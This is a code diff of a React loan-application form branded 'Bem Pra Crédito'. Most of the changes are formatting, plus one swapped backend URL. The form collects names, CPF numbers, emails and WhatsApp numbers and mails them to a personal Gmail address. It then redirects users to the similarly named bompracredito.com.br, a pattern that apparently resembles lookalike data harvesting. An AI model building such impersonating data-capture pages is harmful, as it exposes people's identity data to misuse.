@@ -1,10 +1,10 @@
 import React, { useState } from "react";
-import InputMask from 'react-input-mask';
+import InputMask from "react-input-mask";
 import axios from "axios";
-import { useNavigate } from 'react-router-dom';
+import { useNavigate } from "react-router-dom";
 
 const Header = () => {
-  const navigate = useNavigate(); 
+  const navigate = useNavigate();
   const [step, setStep] = useState(1);
   const [amount, setAmount] = useState(5000);
   const [months, setMonths] = useState("");
@@ -18,7 +18,7 @@ const Header = () => {
   const [isSubmitting, setIsSubmitting] = useState(false); // Estado para controlar o envio
 
   const validateCPF = (cpf) => {
-    cpf = cpf.replace(/[^\d]+/g, ""); 
+    cpf = cpf.replace(/[^\d]+/g, "");
     if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
 
     let soma = 0;
@@ -67,7 +67,10 @@ const Header = () => {
   };
 
   const formatCurrency = (value) => {
-    return parseFloat(value).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    return parseFloat(value).toLocaleString("pt-BR", {
+      style: "currency",
+      currency: "BRL",
+    });
   };
 
   const sendEmail = async (e) => {
@@ -77,17 +80,27 @@ const Header = () => {
 
     setIsSubmitting(true); // Bloqueia novos cliques no botão de envio
 
-    const lastSubmitTime = localStorage.getItem('lastSubmitTime');
+    const lastSubmitTime = localStorage.getItem("lastSubmitTime");
     const now = Date.now();
 
     if (lastSubmitTime && now - lastSubmitTime < 10 * 60 * 1000) {
-      const minutesLeft = Math.ceil((10 * 60 * 1000 - (now - lastSubmitTime)) / 60000);
-      alert(`Você precisa esperar ${minutesLeft} minutos antes de reenviar o formulário.`);
+      const minutesLeft = Math.ceil(
+        (10 * 60 * 1000 - (now - lastSubmitTime)) / 60000
+      );
+      alert(
+        `Você precisa esperar ${minutesLeft} minutos antes de reenviar o formulário.`
+      );
       setIsSubmitting(false); // Libera o botão de envio
       return;
     }
 
-    if (!formData.name || !formData.cef || !formData.email || !formData.whatsapp || !months) {
+    if (
+      !formData.name ||
+      !formData.cef ||
+      !formData.email ||
+      !formData.whatsapp ||
+      !months
+    ) {
       alert("Por favor, preencha todos os campos...");
       setIsSubmitting(false); // Libera o botão de envio
       return;
@@ -109,7 +122,7 @@ const Header = () => {
     `;
 
     try {
-      await axios.post("https://meuback-xqw0.onrender.com/api/send", {
+      await axios.post("https://meuback-1ig6.onrender.com", {
         from: "bempracredito@gmail.com",
         to: "fichasmarcuscarioca@gmail.com",
         subject: "Nova Ficha | Bem Pra Crédito",
@@ -117,21 +130,22 @@ const Header = () => {
       });
 
       setFormData({
-        name: '',
-        cef: '',
-        email: '',
-        whatsapp: ''
+        name: "",
+        cef: "",
+        email: "",
+        whatsapp: "",
       });
-      setMonths('');
-      setAmount('');
+      setMonths("");
+      setAmount("");
 
       setShowModal(true);
 
-      localStorage.setItem('lastSubmitTime', Date.now());
+      localStorage.setItem("lastSubmitTime", Date.now());
 
       setTimeout(() => {
         setShowModal(false);
-        window.location.href = "https://www.bompracredito.com.br/emprestimo-pessoal";
+        window.location.href =
+          "https://www.bompracredito.com.br/emprestimo-pessoal";
       }, 1000);
     } catch (error) {
       console.error("Erro ao enviar o email:", error);
@@ -228,7 +242,7 @@ const Header = () => {
               Preencha seus dados:
             </h2>
             <form onSubmit={sendEmail}>
-            <div className="mb-4">
+              <div className="mb-4">
                 <input
                   type="text"
                   name="name"
@@ -274,10 +288,14 @@ const Header = () => {
               </div>
               <button
                 type="submit"
-                className={`w-full bg-green-500 text-white py-2 px-4 rounded-md font-bold ${isSubmitting ? 'opacity-50 cursor-not-allowed' : 'hover:bg-green-600'}`}
-                disabled={isSubmitting} 
+                className={`w-full bg-green-500 text-white py-2 px-4 rounded-md font-bold ${
+                  isSubmitting
+                    ? "opacity-50 cursor-not-allowed"
+                    : "hover:bg-green-600"
+                }`}
+                disabled={isSubmitting}
               >
-                {isSubmitting ? 'Enviando...' : 'Enviar'}
+                {isSubmitting ? "Enviando..." : "Enviar"}
               </button>
             </form>
           </div>
@@ -285,14 +303,17 @@ const Header = () => {
         {showModal && (
           <div className="fixed p-4 inset-0 flex items-center justify-center bg-black bg-opacity-50">
             <div className="bg-white p-6 rounded-lg">
-              <h2 className="text-lg font-semibold mb-4">Sua solicitação foi enviada com sucesso!</h2>
-              <p className="text-sm">Em breve um de nossos consultores irá entrar em contato.</p>
+              <h2 className="text-lg font-semibold mb-4">
+                Sua solicitação foi enviada com sucesso!
+              </h2>
+              <p className="text-sm">
+                Em breve um de nossos consultores irá entrar em contato.
+              </p>
             </div>
           </div>
         )}
       </div>
     </div>
-    
   );
 };
 
